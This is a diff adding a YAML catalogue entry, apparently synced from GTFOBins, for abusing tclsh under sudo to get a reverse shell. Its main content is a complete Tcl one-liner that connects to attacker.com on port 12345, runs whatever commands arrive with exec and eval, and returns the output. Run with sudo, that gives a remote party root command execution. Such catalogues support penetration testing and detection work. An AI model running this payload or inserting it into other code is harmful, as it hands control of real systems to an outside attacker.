@@ -1,0 +1,28 @@
+id: gtfobins/tclsh/reverse-shell/sudo
+type: binary
+platform: linux
+name: tclsh
+phases:
+- execution
+- command-and-control
+- privilege-escalation
+capabilities:
+- reverse-shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'tclsh
+
+    set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec
+    $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;'
+references:
+- https://gtfobins.github.io/gtfobins/tclsh/
+tags:
+- linux
+- unix
+- gtfobins
